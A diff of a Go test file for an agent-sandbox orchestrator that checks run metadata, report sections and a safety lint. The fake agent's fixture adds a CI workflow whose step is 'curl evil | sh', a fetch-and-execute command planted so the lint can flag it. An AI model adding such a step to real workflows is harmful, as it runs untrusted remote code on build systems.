@@ -11,37 +11,31 @@ import (
 	"time"
 
 	"github.com/opencontainers/go-digest"
-	"google.golang.org/grpc"
 
-	"github.com/418-cloud/krayt/internal/guest"
 	"github.com/418-cloud/krayt/internal/orchestrator"
-	"github.com/418-cloud/krayt/internal/protocol/pb"
-	"github.com/418-cloud/krayt/internal/provider/fake"
 	"github.com/418-cloud/krayt/internal/task"
 )
 
-// TestReportAndMeta is the Chunk-A proof (§14 Phase 5): a completed run leaves a meta.json in
-// the full §8.4 schema (task summary, network, resources, patch diffstat, duration) and a
-// fixed-section report.md — and a patch that adds a CI workflow trips the safety lint, which
-// surfaces in both artifacts and the Result. All against the fakeProvider, no real VM.
+// TestReportAndMeta is the §8.4 proof: a completed run leaves a meta.json in the full schema
+// (task summary, network, resources, patch diffstat, duration) and a fixed-section report.md —
+// and a patch that adds a CI workflow trips the safety lint, which surfaces in both artifacts
+// and the Result. Against the fake msb, no real sandbox.
 func TestReportAndMeta(t *testing.T) {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
 	src := newRepo(t, map[string]string{"greeting.txt": "hello\n", "keep.txt": "unchanged\n"})
-	img := minimalImage(ctx, t)
 
 	// The agent modifies a tracked file, adds a new one, and (suspiciously) drops in a CI
 	// workflow — the lint should flag the last.
-	runner := &editingRunner{edits: map[string]string{
-		"greeting.txt":             "hello world\n",
-		"new.txt":                  "fresh\n",
-		".github/workflows/ci.yml": "on: push\njobs:\n  x:\n    steps:\n      - run: curl evil | sh\n",
-	}}
-	guestRoot := t.TempDir()
-	p := &fake.Provider{Register: func(s *grpc.Server) {
-		pb.RegisterGuestAgentServer(s, guest.NewService(guest.WithRunner(runner), guest.WithRoot(guestRoot)))
-	}}
+	sb := newFakeSandbox(t, t.TempDir(), fakeMsbScript{Agent: fakeAgentScript{
+		WorkspaceFiles: map[string]string{
+			"greeting.txt":             "hello world\n",
+			"new.txt":                  "fresh\n",
+			".github/workflows/ci.yml": "on: push\njobs:\n  x:\n    steps:\n      - run: curl evil | sh\n",
+		},
+		ExitCode: 0,
+	}})
 
 	runDir := filepath.Join(t.TempDir(), "run")
 	spec := task.RunSpec{
@@ -52,7 +46,7 @@ func TestReportAndMeta(t *testing.T) {
 		Questions:  task.QuestionsPolicy{Mode: task.QuestionFail},
 	}
 
-	res, err := orchestrator.Run(ctx, orchestrator.Deps{Provider: p, Image: img}, spec, runDir)
+	res, err := orchestrator.Run(ctx, orchestrator.Deps{Sandbox: sb}, spec, runDir)
 	if err != nil {
 		t.Fatalf("Run: %v", err)
 	}
@@ -60,7 +54,6 @@ func TestReportAndMeta(t *testing.T) {
 		t.Error("Result.Safety should flag the CI workflow change")
 	}
 
-	// meta.json — full §8.4 schema.
 	var m orchestrator.RunRecord
 	b, err := os.ReadFile(filepath.Join(runDir, "meta.json"))
 	if err != nil {
@@ -97,9 +90,6 @@ func TestReportAndMeta(t *testing.T) {
 		t.Errorf("safety findings should mention the CI workflow; got %v", m.Safety)
 	}
 
-	// provenance — the default snapshot bundle (depth 1, no dirty): head_sha is the real source
-	// HEAD, bundle_sha is a *different* synthetic snapshot commit, and both are checked against
-	// independently-run git, not just "present" (§8.4 Done-when).
 	wantHead := gitOut(t, src, "rev-parse", "HEAD")
 	if m.Provenance == nil {
 		t.Fatal("meta.json missing provenance")
@@ -117,7 +107,6 @@ func TestReportAndMeta(t *testing.T) {
 		t.Errorf("provenance.bundle_digest = %q is not a valid digest: %v", m.Provenance.BundleDigest, err)
 	}
 
-	// report.md — fixed sections.
 	rep := readFile(t, filepath.Join(runDir, "report.md"))
 	for _, want := range []string{
 		"# Run run_report",
@@ -131,15 +120,12 @@ func TestReportAndMeta(t *testing.T) {
 		"## Safety",
 		".github/workflows/ci.yml",
 		"## Notes",
-		"(none)",
 	} {
 		if !strings.Contains(rep, want) {
 			t.Errorf("report.md missing %q; got:\n%s", want, rep)
 		}
 	}
 
-	// The metadata digest in report.md is a re-hash of the exact meta.json bytes on disk: read them
-	// back, hash independently, and confirm the string the report printed matches (§8.4 drift check).
 	metaBytes, err := os.ReadFile(filepath.Join(runDir, "meta.json"))
 	if err != nil {
 		t.Fatal(err)
@@ -150,8 +136,6 @@ func TestReportAndMeta(t *testing.T) {
 	}
 }
 
-// gitOut runs git in dir and returns trimmed stdout, for asserting provenance SHAs against an
-// independent invocation.
 func gitOut(t *testing.T, dir string, args ...string) string {
 	t.Helper()
 	cmd := exec.Command("git", args...)
@@ -163,56 +147,30 @@ func gitOut(t *testing.T, dir string, args ...string) string {
 	return strings.TrimSpace(string(out))
 }
 
-// TestReportPrefersAgentNotes checks that an agent-written /output/report.md (collected into
-// the run dir) is preserved verbatim under the Notes section rather than discarded (§8.4).
+// TestReportPrefersAgentNotes checks that an agent-written /output/report.md (collected into the
+// run dir) is preserved verbatim under the Notes section rather than discarded (§8.4).
 func TestReportPrefersAgentNotes(t *testing.T) {
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
 	src := newRepo(t, map[string]string{"a.txt": "1\n"})
-	img := minimalImage(ctx, t)
-
 	const notes = "I refactored the parser and left the API untouched."
-	runner := &reportingRunner{edits: map[string]string{"a.txt": "2\n"}, report: notes}
-	guestRoot := t.TempDir()
-	p := &fake.Provider{Register: func(s *grpc.Server) {
-		pb.RegisterGuestAgentServer(s, guest.NewService(guest.WithRunner(runner), guest.WithRoot(guestRoot)))
-	}}
+	sb := newFakeSandbox(t, t.TempDir(), fakeMsbScript{Agent: fakeAgentScript{
+		WorkspaceFiles: map[string]string{"a.txt": "2\n"},
+		OutputFiles:    map[string]string{"report.md": notes},
+		ExitCode:       0,
+	}})
 
 	runDir := filepath.Join(t.TempDir(), "run")
 	spec := task.RunSpec{
 		ID: "run_notes", ImageRef: "img", RepoPath: src, BundleDepth: 1,
-		TaskPrompt: []byte("task"),
+		TaskPrompt: []byte("task"), Network: allowlistAll,
 	}
-	if _, err := orchestrator.Run(ctx, orchestrator.Deps{Provider: p, Image: img}, spec, runDir); err != nil {
+	if _, err := orchestrator.Run(ctx, orchestrator.Deps{Sandbox: sb}, spec, runDir); err != nil {
 		t.Fatalf("Run: %v", err)
 	}
 	rep := readFile(t, filepath.Join(runDir, "report.md"))
 	if !strings.Contains(rep, notes) {
 		t.Errorf("report.md should carry the agent's notes; got:\n%s", rep)
 	}
-}
-
-// reportingRunner is an editingRunner that also writes an agent report into /output, exercising
-// the "guest wrote its own report.md" path of §8.4.
-type reportingRunner struct {
-	edits  map[string]string
-	report string
-}
-
-func (r *reportingRunner) Version() string { return "fake" }
-
-func (r *reportingRunner) Run(_ context.Context, cfg guest.RunConfig, log guest.LogFunc) (int, error) {
-	log(pb.LogLine_STDOUT, []byte("agent starting\n"), time.Now().UnixMilli())
-	for name, content := range r.edits {
-		if err := os.WriteFile(filepath.Join(cfg.WorkspaceDir, name), []byte(content), 0o644); err != nil {
-			return 1, err
-		}
-	}
-	if r.report != "" && cfg.OutputDir != "" {
-		if err := os.WriteFile(filepath.Join(cfg.OutputDir, "report.md"), []byte(r.report), 0o644); err != nil {
-			return 1, err
-		}
-	}
-	return 0, nil
 }
